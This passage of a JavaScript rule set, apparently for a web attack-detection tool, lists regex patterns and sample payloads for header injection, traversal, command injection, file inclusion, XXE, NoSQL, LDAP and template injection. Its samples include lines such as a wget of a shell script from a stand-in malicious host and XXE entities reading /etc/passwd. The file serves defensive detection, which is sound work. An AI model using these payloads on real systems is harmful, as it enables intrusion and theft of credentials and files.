                    '{"$where": "function() { return true; }"}',
                    '{"data": "value\\u0000malicious"}',
                    '{"comment": "/* this is not valid JSON */"}',
                    '{"bignum": 99999999999999999999999999999999}'
                ]
            },
            httpheaders: {
                name: 'HTTP Headers',
                icon: 'fas fa-network-wired',
                color: 'green',
                severity: 'high',
                description: 'Protect against HTTP header injection and manipulation attacks',
                categories: {
                    'Header Injection': [
                        { pattern: '\\r\\n', display: 'CRLF', desc: 'Carriage return line feed', severity: 'high' },
                        { pattern: '\\n', display: 'LF', desc: 'Line feed character', severity: 'medium' },
                        { pattern: '%0[dD]%0[aA]', display: '%0D%0A', desc: 'URL encoded CRLF', severity: 'high' },
                        { pattern: '%0[aA]', display: '%0A', desc: 'URL encoded line feed', severity: 'medium' },
                        { pattern: '%250[dD]%250[aA]', display: 'Double Encoded', desc: 'Double encoded CRLF', severity: 'high' }
                    ],
                    'Dangerous Headers': [
                        { pattern: '(?i)Content-Length\\s*:\\s*\\d+\\s*\\r?\\n\\s*Content-Length', display: 'Duplicate Content-Length', desc: 'HTTP request smuggling', severity: 'critical' },
                        { pattern: '(?i)Transfer-Encoding\\s*:\\s*chunked.*Content-Length', display: 'TE + CL', desc: 'Request smuggling vectors', severity: 'critical' },
                        { pattern: '(?i)X-Forwarded-(?:For|Host|Proto)\\s*:', display: 'X-Forwarded Headers', desc: 'Proxy header injection', severity: 'medium' },
                        { pattern: '(?i)X-Original-URL\\s*:', display: 'X-Original-URL', desc: 'URL override attempt', severity: 'high' },
                        { pattern: '(?i)X-Rewrite-URL\\s*:', display: 'X-Rewrite-URL', desc: 'URL rewrite attempt', severity: 'high' }
                    ],
                    'Cache Poisoning': [
                        { pattern: '(?i)X-(?:Host|Forwarded-Host)\\s*:\\s*[^\\s]+', display: 'Host Headers', desc: 'Host header injection', severity: 'high' },
                        { pattern: '(?i)X-Forwarded-Scheme\\s*:', display: 'Scheme Override', desc: 'Protocol downgrade attack', severity: 'medium' },
                        { pattern: '(?i)X-Cache-Key\\s*:', display: 'Cache Key', desc: 'Cache key manipulation', severity: 'medium' }
                    ],
                    'Authentication Bypass': [
                        { pattern: '(?i)Authorization\\s*:\\s*(?:Basic|Bearer)\\s+[A-Za-z0-9+/=]+', display: 'Auth Headers', desc: 'Authentication header injection', severity: 'critical' },
                        { pattern: '(?i)X-(?:User|Username|Email)\\s*:', display: 'User Headers', desc: 'User impersonation attempt', severity: 'high' },
                        { pattern: '(?i)X-(?:Admin|Role|Permission)\\s*:', display: 'Privilege Headers', desc: 'Privilege escalation attempt', severity: 'critical' }
                    ],
                    'Header Value Injection': [
                        { pattern: '(?i)(?:Location|Refresh)\\s*:\\s*[^\\s]*(?:javascript|data):', display: 'Redirect Injection', desc: 'Malicious redirect attempt', severity: 'high' },
                        { pattern: '(?i)Set-Cookie\\s*:.*(?:httponly|secure)\\s*=\\s*false', display: 'Cookie Flags', desc: 'Cookie security bypass', severity: 'high' },
                        { pattern: '(?i)Content-Type\\s*:\\s*[^;]+;\\s*charset\\s*=\\s*utf-7', display: 'UTF-7 Content', desc: 'UTF-7 XSS attempt', severity: 'high' }
                    ]
                },
                samples: [
                    "Host: example.com\\r\\nX-Injected: malicious",
                    "X-Forwarded-For: 127.0.0.1\\r\\nX-Admin: true",
                    "Authorization: Basic YWRtaW46YWRtaW4=",
                    "Content-Length: 10\\r\\nContent-Length: 20",
                    "X-Original-URL: /admin",
                    "Location: javascript:alert(1)"
                ]
            },
            uriparams: {
                name: 'URI and Parameters',
                icon: 'fas fa-link',
                color: 'yellow',
                severity: 'high',
                description: 'Detect malicious URI patterns and parameter manipulation',
                categories: {
                    'Path Traversal': [
                        { pattern: '\\.\\./(?:\\.\\./)*', display: '../', desc: 'Directory traversal attempt', severity: 'high' },
                        { pattern: '\\.\\\\(?:\\.\\\\)*', display: '.\\', desc: 'Windows path traversal', severity: 'high' },
                        { pattern: '(?:%2e){2}(?:%2f|%5c)', display: '%2e%2e/', desc: 'Encoded traversal', severity: 'high' },
                        { pattern: '(?:\\.){2,}(?:/|\\\\)', display: 'Multiple dots', desc: 'Obfuscated traversal', severity: 'medium' }
                    ],
                    'Parameter Pollution': [
                        { pattern: '[?&]\\w+=[^&]*&\\1=', display: 'Duplicate Params', desc: 'HTTP parameter pollution', severity: 'medium' },
                        { pattern: '[?&]\\w+\\[\\]\\s*=', display: 'Array Params', desc: 'Array parameter injection', severity: 'medium' },
                        { pattern: '[?&]\\w+\\[\\w+\\]\\s*=', display: 'Hash Params', desc: 'Hash parameter injection', severity: 'medium' },
                        { pattern: '[?&](?:_method|method)\\s*=\\s*(?:PUT|DELETE)', display: 'Method Override', desc: 'HTTP method override', severity: 'high' }
                    ],
                    'Special Characters': [
                        { pattern: '[?&][^=&]*[<>"\']', display: 'Special Chars', desc: 'Special characters in parameters', severity: 'medium' },
                        { pattern: '[?&][^=&]*\\$\\{', display: '${} Injection', desc: 'Template injection attempt', severity: 'high' },
                        { pattern: '[?&][^=&]*\\{\\{', display: '{{}} Injection', desc: 'Template expression injection', severity: 'high' },
                        { pattern: '[?&][^=&]*%00', display: 'NULL Byte', desc: 'NULL byte injection', severity: 'high' }
                    ],
                    'URL Fragments': [
                        { pattern: '#.*(?:javascript|vbscript):', display: 'Script in Fragment', desc: 'Script protocol in fragment', severity: 'high' },
                        { pattern: '#.*<[^>]+>', display: 'HTML in Fragment', desc: 'HTML tags in fragment', severity: 'medium' },
                        { pattern: '#.*\\bon\\w+\\s*=', display: 'Events in Fragment', desc: 'Event handlers in fragment', severity: 'high' }
                    ],
                    'Query String Attacks': [
                        { pattern: '\\?[^=&]{1000,}', display: 'Long Parameter', desc: 'Abnormally long parameter name', severity: 'low' },
                        { pattern: '=[^&]{10000,}', display: 'Long Value', desc: 'Abnormally long parameter value', severity: 'low' },
                        { pattern: '(?:[?&][^=&]+=[^&]*){50,}', display: 'Many Parameters', desc: 'Excessive parameter count', severity: 'low' }
                    ]
                },
                samples: [
                    "?file=../../../etc/passwd",
                    "?id=1&id=2",
                    "?user[admin]=true",
                    "?redirect=javascript:alert(1)",
                    "?template=${''.class.forName('java.lang.Runtime')}",
                    "?file=test.php%00.jpg"
                ]
            },
            uriencoding: {
                name: 'URI Encoding and Validation',
                icon: 'fas fa-percent',
                color: 'indigo',
                severity: 'medium',
                description: 'Detect encoding-based bypasses and malformed URIs',
                categories: {
                    'Multiple Encoding': [
                        { pattern: '%25[0-9a-fA-F]{2}', display: 'Double Encoding', desc: 'Double URL encoding', severity: 'high' },
                        { pattern: '%2525[0-9a-fA-F]{2}', display: 'Triple Encoding', desc: 'Triple URL encoding', severity: 'high' },
                        { pattern: '(?:%[0-9a-fA-F]{2}){10,}', display: 'Excessive Encoding', desc: 'Overuse of URL encoding', severity: 'medium' }
                    ],
                    'Invalid Encoding': [
                        { pattern: '%[0-9a-fA-F](?![0-9a-fA-F])', display: 'Incomplete Encoding', desc: 'Malformed percent encoding', severity: 'medium' },
                        { pattern: '%[^0-9a-fA-F]{2}', display: 'Invalid Hex', desc: 'Non-hex in percent encoding', severity: 'medium' },
                        { pattern: '%u[0-9a-fA-F]{4}', display: '%uXXXX', desc: 'IIS Unicode encoding', severity: 'high' },
                        { pattern: '%%', display: 'Double Percent', desc: 'Double percent sign', severity: 'low' }
                    ],
                    'Overlong UTF-8': [
                        { pattern: '%c0%[8-9a-fA-F][0-9a-fA-F]', display: 'Overlong ASCII', desc: '2-byte overlong ASCII', severity: 'high' },
                        { pattern: '%e0%80%[8-9a-bA-B][0-9a-fA-F]', display: '3-byte Overlong', desc: '3-byte overlong encoding', severity: 'high' },
                        { pattern: '%f0%80%80%[8-9a-bA-B][0-9a-fA-F]', display: '4-byte Overlong', desc: '4-byte overlong encoding', severity: 'high' }
                    ],
                    'Case Variations': [
                        { pattern: '%[0-9A-F]{2}%[0-9a-f]{2}', display: 'Mixed Case', desc: 'Mixed case hex encoding', severity: 'low' },
                        { pattern: '(?i)%2f|%5c', display: 'Encoded Slash', desc: 'Encoded path separators', severity: 'medium' },
                        { pattern: '(?i)%3c|%3e', display: 'Encoded Brackets', desc: 'Encoded angle brackets', severity: 'medium' }
                    ],
                    'Non-ASCII Characters': [
                        { pattern: '[\\x80-\\xFF]', display: 'Raw High Bytes', desc: 'Unencoded non-ASCII bytes', severity: 'medium' },
                        { pattern: '%[cC][0-9a-fA-F]%[0-9a-fA-F]{2}', display: 'UTF-8 Sequences', desc: 'UTF-8 multibyte sequences', severity: 'low' }
                    ]
                },
                samples: [
                    "%252e%252e%252f",
                    "%25%32%65%25%32%65%25%32%66",
                    "%c0%af%c0%af",
                    "%u002e%u002e%u002f",
                    "%2E%2e%2F",
                    "%%32%65"
                ]
            },
            fileupload: {
                name: 'File Upload and Multipart',
                icon: 'fas fa-upload',
                color: 'teal',
                severity: 'critical',
                description: 'Prevent malicious file uploads and multipart form attacks',
                categories: {
                    'Dangerous Extensions': [
                        { pattern: '\\.(?:php[0-9]?|phtml|phar)(?:\\.|$|\\s)', display: 'PHP Files', desc: 'PHP executable files', severity: 'critical' },
                        { pattern: '\\.(?:asp|aspx|asa|asax|ascx|ashx|asmx)(?:\\.|$|\\s)', display: 'ASP Files', desc: 'ASP.NET executable files', severity: 'critical' },
                        { pattern: '\\.(?:jsp|jspx|jsw|jsv|jspf)(?:\\.|$|\\s)', display: 'JSP Files', desc: 'Java Server Pages', severity: 'critical' },
                        { pattern: '\\.(?:exe|dll|com|bat|cmd|scr|vbs|js)(?:\\.|$|\\s)', display: 'Executables', desc: 'Windows executable files', severity: 'critical' },
                        { pattern: '\\.(?:sh|bash|zsh|csh|tcsh|ksh)(?:\\.|$|\\s)', display: 'Shell Scripts', desc: 'Unix shell scripts', severity: 'high' }
                    ],
                    'Double Extensions': [
                        { pattern: '\\.[^.]+\\.(?:jpg|jpeg|png|gif|pdf|txt)', display: 'Double Extension', desc: 'Hidden executable extension', severity: 'high' },
                        { pattern: '\\.php\\.', display: '.php.', desc: 'PHP with double extension', severity: 'critical' },
                        { pattern: '\\.[^.]+\\x00\\.', display: 'NULL Byte', desc: 'NULL byte extension bypass', severity: 'critical' },
                        { pattern: '\\.[^.]+%00\\.', display: 'Encoded NULL', desc: 'Encoded NULL byte bypass', severity: 'critical' }
                    ],
                    'MIME Type Attacks': [
                        { pattern: 'Content-Type\\s*:\\s*[^;\\s]+/[^;\\s]+\\s*;.*charset\\s*=\\s*utf-7', display: 'UTF-7 MIME', desc: 'UTF-7 charset in MIME', severity: 'high' },
                        { pattern: 'Content-Type\\s*:\\s*(?:text|application)/(?:html|xhtml|xml)', display: 'Executable MIME', desc: 'Potentially executable MIME type', severity: 'medium' },
                        { pattern: 'Content-Type\\s*:\\s*[^\\r\\n]*[<>]', display: 'MIME Injection', desc: 'Special chars in MIME type', severity: 'medium' }
                    ],
                    'Multipart Attacks': [
                        { pattern: 'Content-Disposition\\s*:.*filename\\s*=\\s*"[^"]*[\\r\\n]', display: 'Filename CRLF', desc: 'CRLF in filename', severity: 'high' },
                        { pattern: 'Content-Disposition\\s*:.*filename\\s*=\\s*"[^"]*\\.\\./', display: 'Path in Filename', desc: 'Path traversal in filename', severity: 'high' },
                        { pattern: 'boundary\\s*=\\s*[^;\\s]*[\'\"<>]', display: 'Boundary Injection', desc: 'Special chars in boundary', severity: 'medium' }
                    ],
                    'Magic Bytes Bypass': [
                        { pattern: '^\\x89PNG', display: 'PNG Header', desc: 'PNG magic bytes', severity: 'low' },
                        { pattern: '^GIF8[79]', display: 'GIF Header', desc: 'GIF magic bytes', severity: 'low' },
                        { pattern: '^\\xFF\\xD8\\xFF', display: 'JPEG Header', desc: 'JPEG magic bytes', severity: 'low' },
                        { pattern: '^%PDF', display: 'PDF Header', desc: 'PDF magic bytes', severity: 'low' },
                        { pattern: '<\\?php', display: 'PHP in File', desc: 'PHP code in uploaded file', severity: 'critical' }
                    ]
                },
                samples: [
                    "shell.php",
                    "image.jpg.php",
                    "test.php%00.jpg",
                    "exploit.php.jpg",
                    "Content-Type: text/html",
                    "filename=\"../../shell.php\""
                ]
            },
            dirbruteforce: {
                name: 'Directory Brute Force and Discovery',
                icon: 'fas fa-folder-tree',
                color: 'pink',
                severity: 'medium',
                description: 'Detect directory enumeration and forced browsing attempts',
                categories: {
                    'Common Directories': [
                        { pattern: '/(?:admin|administrator|wp-admin|phpmyadmin|adminer)(?:/|$)', display: 'Admin Directories', desc: 'Administrative interface discovery', severity: 'high' },
                        { pattern: '/(?:backup|backups|bak|old|temp|tmp|test|dev)(?:/|$)', display: 'Backup Directories', desc: 'Backup and temporary directories', severity: 'high' },
                        { pattern: '/(?:config|conf|configuration|settings|env)(?:/|$)', display: 'Config Directories', desc: 'Configuration directories', severity: 'high' },
                        { pattern: '/(?:api|rest|graphql|swagger|docs)(?:/|$)', display: 'API Directories', desc: 'API endpoint discovery', severity: 'medium' },
                        { pattern: '/(?:upload|uploads|files|images|media|assets)(?:/|$)', display: 'Upload Directories', desc: 'File upload directories', severity: 'medium' }
                    ],
                    'Sensitive Files': [
                        { pattern: '/\\.(?:git|svn|hg|bzr)/', display: 'VCS Directories', desc: 'Version control directories', severity: 'critical' },
                        { pattern: '\\.(?:bak|backup|old|orig|copy|save)', display: 'Backup Files', desc: 'Backup file extensions', severity: 'high' },
                        { pattern: '(?:config|settings|database|db)\\.(?:php|inc|ini|json|yml|yaml|xml)', display: 'Config Files', desc: 'Configuration files', severity: 'critical' },
                        { pattern: '\\.(?:sql|dump|db|sqlite)', display: 'Database Files', desc: 'Database dump files', severity: 'critical' },
                        { pattern: '\\.env(?:\\..*)?$', display: '.env Files', desc: 'Environment configuration files', severity: 'critical' }
                    ],
                    'Information Disclosure': [
                        { pattern: '/(?:phpinfo|info|test|hello)\\.php', display: 'Info Scripts', desc: 'Information disclosure scripts', severity: 'high' },
                        { pattern: '/(?:readme|README|changelog|CHANGELOG|license|LICENSE)', display: 'Documentation', desc: 'Project documentation files', severity: 'low' },
                        { pattern: '\\.(?:log|logs|error|errors|debug)', display: 'Log Files', desc: 'Application log files', severity: 'high' },
                        { pattern: '/(?:robots\\.txt|sitemap\\.xml|crossdomain\\.xml)', display: 'Web Files', desc: 'Web configuration files', severity: 'low' }
                    ],
                    'Archive Files': [
                        { pattern: '\\.(?:zip|rar|7z|tar|gz|bz2|xz)', display: 'Archives', desc: 'Compressed archive files', severity: 'medium' },
                        { pattern: '(?:www|public_html|htdocs|web|site)\\.(?:zip|tar\\.gz)', display: 'Web Archives', desc: 'Website backup archives', severity: 'high' },
                        { pattern: '(?:backup|bkp|bak).*\\.(?:zip|tar|rar)', display: 'Backup Archives', desc: 'Backup archive files', severity: 'high' }
                    ],
                    'Scanner Patterns': [
                        { pattern: '(?:/[^/]*){10,}/', display: 'Deep Paths', desc: 'Abnormally deep directory paths', severity: 'low' },
                        { pattern: '/[a-zA-Z0-9]{32,}/', display: 'Hash Paths', desc: 'Hash-like directory names', severity: 'low' },
                        { pattern: '/(?:~|%7E)[^/]+/', display: 'User Directories', desc: 'Unix user home directories', severity: 'medium' }
                    ]
                },
                samples: [
                    "/admin/",
                    "/.git/config",
                    "/backup.zip",
                    "/.env",
                    "/wp-config.php.bak",
                    "/api/swagger.json"
                ]
            },
            cmdi: {
                name: 'Command Injection',
                icon: 'fas fa-terminal',
                color: 'purple',
                severity: 'critical',
                description: 'Prevent OS command execution attacks',
                categories: {
                    'Command Separators': [
                        { pattern: ';\\s*\\w+', display: '; command', desc: 'Command chaining with semicolon', severity: 'critical' },
                        { pattern: '\\|\\s*\\w+', display: '| command', desc: 'Pipe command execution', severity: 'critical' },
                        { pattern: '&\\s*\\w+', display: '& command', desc: 'Background command execution', severity: 'high' },
                        { pattern: '&&\\s*\\w+', display: '&& command', desc: 'Conditional command execution', severity: 'high' },
                        { pattern: '\\|\\|\\s*\\w+', display: '|| command', desc: 'Alternative command execution', severity: 'high' },
                        { pattern: '`[^`]+`', display: 'Backticks', desc: 'Command substitution with backticks', severity: 'critical' }
                    ],
                    'System Commands': [
                        { pattern: '(?i)\\b(?:cat|type)\\b', display: 'cat/type', desc: 'File content reading', severity: 'high' },
                        { pattern: '(?i)\\b(?:ls|dir)\\b', display: 'ls/dir', desc: 'Directory listing', severity: 'medium' },
                        { pattern: '(?i)\\bwhoami\\b', display: 'whoami', desc: 'User identification', severity: 'medium' },
                        { pattern: '(?i)\\bid\\b', display: 'id', desc: 'User ID information', severity: 'medium' },
                        { pattern: '(?i)\\bpwd\\b', display: 'pwd', desc: 'Current directory path', severity: 'low' },
                        { pattern: '(?i)\\buname\\b', display: 'uname', desc: 'System information', severity: 'low' }
                    ],
                    'Dangerous Commands': [
                        { pattern: '(?i)\\b(?:rm|del)\\b', display: 'rm/del', desc: 'File/directory deletion', severity: 'critical' },
                        { pattern: '(?i)\\b(?:wget|curl)\\b', display: 'wget/curl', desc: 'Remote file download', severity: 'high' },
                        { pattern: '(?i)\\b(?:nc|netcat)\\b', display: 'netcat', desc: 'Network connection tool', severity: 'critical' },
                        { pattern: '(?i)\\b(?:bash|sh|cmd)\\b', display: 'Shell execution', desc: 'Shell command execution', severity: 'critical' },
                        { pattern: '(?i)\\b(?:python|perl|ruby)\\b', display: 'Script interpreters', desc: 'Script language execution', severity: 'high' },
                        { pattern: '(?i)\\b(?:chmod|chown)\\b', display: 'Permission changes', desc: 'File permission modification', severity: 'high' }
                    ],
                    'Command Substitution': [
                        { pattern: '\\$\\([^)]+\\)', display: '$(...)', desc: 'Command substitution syntax', severity: 'critical' },
                        { pattern: '\\${[^}]+}', display: '${...}', desc: 'Variable/command substitution', severity: 'high' },
                        { pattern: '%\\w+%', display: '%VAR%', desc: 'Windows environment variable', severity: 'medium' }
                    ]
                },
                samples: [
                    "; cat /etc/passwd",
                    "| whoami",
                    "&& ls -la",
                    "$(cat /etc/shadow)",
                    "`id`",
                    "; wget http://malicious.com/shell.sh"
                ]
            },
            lfi: {
                name: 'Local File Inclusion',
                icon: 'fas fa-folder-open',
                color: 'green',
                severity: 'high',
                description: 'Block file system traversal attacks',
                categories: {
                    'Path Traversal': [
                        { pattern: '\\.\\./(?:\\.\\./)*', display: '../', desc: 'Unix path traversal sequence', severity: 'high' },
                        { pattern: '\\.\\\\(?:\\.\\\\)*', display: '..\\', desc: 'Windows path traversal sequence', severity: 'high' },
                        { pattern: '\\.\\./\\.\\./\\.\\./(?:\\.\\./)*', display: 'Deep traversal', desc: 'Multiple level traversal', severity: 'high' }
                    ],
                    'Encoded Traversal': [
                        { pattern: '%2e%2e%2f', display: '%2e%2e%2f', desc: 'URL encoded ../', severity: 'high' },
                        { pattern: '%2e%2e%5c', display: '%2e%2e%5c', desc: 'URL encoded ..\\', severity: 'high' },
                        { pattern: '%252e%252e%252f', display: 'Double encoded', desc: 'Double URL encoded traversal', severity: 'high' },
                        { pattern: '\\.\\%c0%af', display: 'UTF-8 encoded', desc: 'UTF-8 overlong encoding', severity: 'medium' },
                        { pattern: '\\.\\%c1%9c', display: 'Unicode bypass', desc: 'Unicode normalization bypass', severity: 'medium' }
                    ],
                    'System Files': [
                        { pattern: '(?i)(?:\\.\\./)*etc/passwd', display: '/etc/passwd', desc: 'Unix password file', severity: 'critical' },
                        { pattern: '(?i)(?:\\.\\./)*etc/shadow', display: '/etc/shadow', desc: 'Unix shadow password file', severity: 'critical' },
                        { pattern: '(?i)(?:\\.\\./)*etc/hosts', display: '/etc/hosts', desc: 'System hosts file', severity: 'medium' },
                        { pattern: '(?i)(?:\\.\\./)*proc/version', display: '/proc/version', desc: 'System version information', severity: 'low' },
                        { pattern: '(?i)(?:\\.\\./)*windows/system32/config/sam', display: 'Windows SAM', desc: 'Windows user accounts database', severity: 'critical' },
                        { pattern: '(?i)(?:\\.\\./)*windows/win\\.ini', display: 'win.ini', desc: 'Windows configuration file', severity: 'medium' }
                    ],
                    'Web Files': [
                        { pattern: '(?i)(?:\\.\\./)*var/log/apache', display: 'Apache logs', desc: 'Apache web server logs', severity: 'medium' },
                        { pattern: '(?i)(?:\\.\\./)*\\.htaccess', display: '.htaccess', desc: 'Apache configuration file', severity: 'high' },
                        { pattern: '(?i)(?:\\.\\./)*wp-config\\.php', display: 'wp-config.php', desc: 'WordPress configuration', severity: 'high' },
                        { pattern: '(?i)(?:\\.\\./)*config\\.php', display: 'config.php', desc: 'PHP configuration file', severity: 'high' }
                    ]
                },
                samples: [
                    "../../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\config\\sam",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "../../../var/log/apache2/access.log",
                    "....//....//....//etc/shadow",
                    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
                ]
            },
            rfi: {
                name: 'Remote File Inclusion',
                icon: 'fas fa-globe',
                color: 'indigo',
                severity: 'critical',
                description: 'Prevent remote code execution via file inclusion',
                categories: {
                    'HTTP/HTTPS URLs': [
                        { pattern: '(?i)https?://[^\\s]+\\.(php|asp|jsp|py)', display: 'Remote Scripts', desc: 'Remote executable file inclusion', severity: 'critical' },
                        { pattern: '(?i)https?://(?:[0-9]{1,3}\\.){3}[0-9]{1,3}', display: 'IP-based URLs', desc: 'Direct IP address URLs', severity: 'high' },
                        { pattern: '(?i)https?://[^\\s]*\\?[^\\s]*=\\s*(?:http|ftp)', display: 'URL Parameters', desc: 'URL with suspicious parameters', severity: 'high' }
                    ],
                    'FTP URLs': [
                        { pattern: '(?i)ftp://[^\\s]+', display: 'FTP URLs', desc: 'File Transfer Protocol URLs', severity: 'high' },
                        { pattern: '(?i)ftps://[^\\s]+', display: 'FTPS URLs', desc: 'Secure FTP URLs', severity: 'high' }
                    ],
                    'Data URLs': [
                        { pattern: '(?i)data://[^\\s]+', display: 'Data URLs', desc: 'Data scheme URLs', severity: 'medium' },
                        { pattern: '(?i)php://[^\\s]+', display: 'PHP Wrappers', desc: 'PHP stream wrappers', severity: 'critical' },
                        { pattern: '(?i)file://[^\\s]+', display: 'File URLs', desc: 'Local file scheme URLs', severity: 'high' }
                    ],
                    'Encoded URLs': [
                        { pattern: '%68%74%74%70', display: 'URL Encoded HTTP', desc: 'URL encoded "http"', severity: 'medium' },
                        { pattern: '\\\\x68\\\\x74\\\\x74\\\\x70', display: 'Hex Encoded HTTP', desc: 'Hex encoded "http"', severity: 'medium' }
                    ]
                },
                samples: [
                    "http://malicious.com/shell.php",
                    "https://192.168.1.100/backdoor.asp",
                    "ftp://attacker.com/exploit.py",
                    "php://input",
                    "data://text/plain;base64,PD9waHAg...",
                    "file:///etc/passwd"
                ]
            },
            xxe: {
                name: 'XML External Entity',
                icon: 'fas fa-file-code',
                color: 'yellow',
                severity: 'high',
                description: 'Block XML-based attacks and data exfiltration',
                categories: {
                    'Entity Declarations': [
                        { pattern: '<!ENTITY[^>]*>', display: '<!ENTITY>', desc: 'XML entity declaration', severity: 'high' },
                        { pattern: '<!DOCTYPE[^>]*>', display: '<!DOCTYPE>', desc: 'Document type declaration', severity: 'medium' },
                        { pattern: '(?i)<!ENTITY\\s+\\w+\\s+SYSTEM', display: 'SYSTEM Entity', desc: 'System entity declaration', severity: 'critical' },
                        { pattern: '(?i)<!ENTITY\\s+\\w+\\s+PUBLIC', display: 'PUBLIC Entity', desc: 'Public entity declaration', severity: 'high' }
                    ],
                    'Protocol Handlers': [
                        { pattern: '(?i)SYSTEM\\s+["\']file:', display: 'file:// protocol', desc: 'File system access', severity: 'critical' },
                        { pattern: '(?i)SYSTEM\\s+["\']https?:', display: 'HTTP(S) protocol', desc: 'Remote HTTP access', severity: 'high' },
                        { pattern: '(?i)SYSTEM\\s+["\']ftp:', display: 'FTP protocol', desc: 'FTP access attempt', severity: 'high' },
                        { pattern: '(?i)SYSTEM\\s+["\']gopher:', display: 'Gopher protocol', desc: 'Gopher protocol access', severity: 'medium' }
                    ],
                    'XXE Payloads': [
                        { pattern: '&\\w+;', display: 'Entity Reference', desc: 'XML entity reference usage', severity: 'medium' },
                        { pattern: '%\\w+;', display: 'Parameter Entity', desc: 'Parameter entity reference', severity: 'high' },
                        { pattern: '(?i)SYSTEM\\s+["\'][^"\']*(?:passwd|shadow|hosts)', display: 'System File Access', desc: 'System file targeting', severity: 'critical' }
                    ],
                    'SOAP/XML Attacks': [
                        { pattern: '(?i)<\\?xml[^>]*encoding\\s*=\\s*["\'][^"\']*utf-7', display: 'UTF-7 Encoding', desc: 'UTF-7 encoding attack', severity: 'medium' },
                        { pattern: '(?i)<!\\[CDATA\\[.*?\\]\\]>', display: 'CDATA Section', desc: 'CDATA injection attempt', severity: 'low' }
                    ]
                },
                samples: [
                    "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://malicious.com/\">]>",
                    "<!ENTITY % xxe SYSTEM \"file:///etc/shadow\">",
                    "&xxe;",
                    "<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=config.php\">"
                ]
            },
            nosqli: {
                name: 'NoSQL Injection',
                icon: 'fas fa-database',
                color: 'teal',
                severity: 'high',
                description: 'Prevent NoSQL database attacks',
                categories: {
                    'MongoDB Operators': [
                        { pattern: '\\$where\\s*:', display: '$where', desc: 'MongoDB where clause injection', severity: 'critical' },
                        { pattern: '\\$ne\\s*:', display: '$ne', desc: 'Not equal operator', severity: 'high' },
                        { pattern: '\\$gt\\s*:', display: '$gt', desc: 'Greater than operator', severity: 'medium' },
                        { pattern: '\\$lt\\s*:', display: '$lt', desc: 'Less than operator', severity: 'medium' },
                        { pattern: '\\$regex\\s*:', display: '$regex', desc: 'Regular expression operator', severity: 'high' },
                        { pattern: '\\$or\\s*:', display: '$or', desc: 'Logical OR operator', severity: 'high' }
                    ],
                    'JavaScript Injection': [
                        { pattern: '(?i)function\\s*\\([^)]*\\)', display: 'JavaScript Functions', desc: 'JavaScript function injection', severity: 'high' },
                        { pattern: '(?i)this\\s*\\.[\\w.]+', display: 'Object Properties', desc: 'Object property access', severity: 'medium' },
                        { pattern: '(?i)return\\s+', display: 'Return Statements', desc: 'JavaScript return statement', severity: 'medium' }
                    ],
                    'JSON Injection': [
                        { pattern: '__proto__', display: '__proto__', desc: 'Prototype pollution attack', severity: 'high' },
                        { pattern: 'constructor', display: 'constructor', desc: 'Constructor property access', severity: 'medium' },
                        { pattern: 'prototype', display: 'prototype', desc: 'Prototype property access', severity: 'medium' }
                    ]
                },
                samples: [
                    "{\"$where\": \"function(){return true}\"}",
                    "{\"password\": {\"$ne\": \"\"}}",
                    "{\"$or\": [{\"user\":\"admin\"}, {\"user\":\"root\"}]}",
                    "{\"age\": {\"$gt\": 0}}",
                    "{\"__proto__\": {\"admin\": true}}",
                    "{\"$regex\": \".*\"}"
                ]
            },
            ldapi: {
                name: 'LDAP Injection',
                icon: 'fas fa-address-book',
                color: 'pink',
                severity: 'medium',
                description: 'Prevent LDAP directory service attacks',
                categories: {
                    'LDAP Operators': [
                        { pattern: '\\(\\s*\\|', display: '(| operator', desc: 'LDAP OR operator', severity: 'high' },
                        { pattern: '\\(\\s*&', display: '(& operator', desc: 'LDAP AND operator', severity: 'medium' },
                        { pattern: '\\(\\s*!', display: '(! operator', desc: 'LDAP NOT operator', severity: 'medium' },
                        { pattern: '\\*\\)', display: 'Wildcard', desc: 'LDAP wildcard injection', severity: 'high' }
                    ],
                    'Filter Injection': [
                        { pattern: '\\(\\s*\\w+\\s*=\\s*\\*\\s*\\)', display: 'Attribute Wildcard', desc: 'Attribute wildcard filter', severity: 'high' },
                        { pattern: '\\)\\s*\\(', display: 'Filter Chaining', desc: 'LDAP filter chaining', severity: 'medium' }
                    ],
                    'Authentication Bypass': [
                        { pattern: '\\(\\s*cn\\s*=\\s*\\*\\s*\\)', display: 'CN Wildcard', desc: 'Common name wildcard', severity: 'high' },
                        { pattern: '\\(\\s*uid\\s*=\\s*\\*\\s*\\)', display: 'UID Wildcard', desc: 'User ID wildcard', severity: 'high' }
                    ]
                },
                samples: [
                    "(|(cn=*)(uid=*))",
                    "*)(&(objectClass=user))",
                    "(cn=*)(|(uid=admin))",
                    "*)|(|(cn=*))",
                    "(uid=*))(&(cn=admin)"
                ]
            },
            ssti: {
                name: 'Server-Side Template Injection',
                icon: 'fas fa-file-alt',
                color: 'red',
                severity: 'critical',
                description: 'Block template engine exploitation',
                categories: {
                    'Template Syntax': [
                        { pattern: '{{[^}]*}}', display: '{{ }}', desc: 'Double brace template syntax', severity: 'high' },
                        { pattern: '{%[^%]*%}', display: '{% %}', desc: 'Jinja2/Django template tags', severity: 'high' },
                        { pattern: '\\${[^}]*}', display: '${...}', desc: 'Expression language injection', severity: 'high' },
                        { pattern: '<%[^%]*%>', display: '<% %>', desc: 'JSP/ASP template syntax', severity: 'high' }
                    ],
                    'Template Functions': [
                        { pattern: '(?i)\\{\\{\\s*config', display: '{{ config', desc: 'Flask config access', severity: 'critical' },
                        { pattern: '(?i)\\{\\{\\s*request', display: '{{ request', desc: 'Request object access', severity: 'high' },
                        { pattern: '(?i)\\{\\{\\s*self\\._TemplateReference__context', display: 'Context Access', desc: 'Template context access', severity: 'high' },
                        { pattern: '(?i)\\{\\{\\s*lipsum\\.__globals__', display: 'Global Access', desc: 'Python globals access', severity: 'critical' }
                    ],
                    'Code Execution': [
                        { pattern: '(?i)\\{\\{\\s*\\w+\\.__class__', display: 'Class Access', desc: 'Python class introspection', severity: 'critical' },
                        { pattern: '(?i)\\{\\{\\s*\\w+\\.__subclasses__', display: 'Subclass Access', desc: 'Python subclass enumeration', severity: 'critical' },
                        { pattern: '(?i)__import__\\s*\\(', display: '__import__()', desc: 'Python import function', severity: 'critical' }
                    ]
                },
                samples: [
                    "{{ config.items() }}",
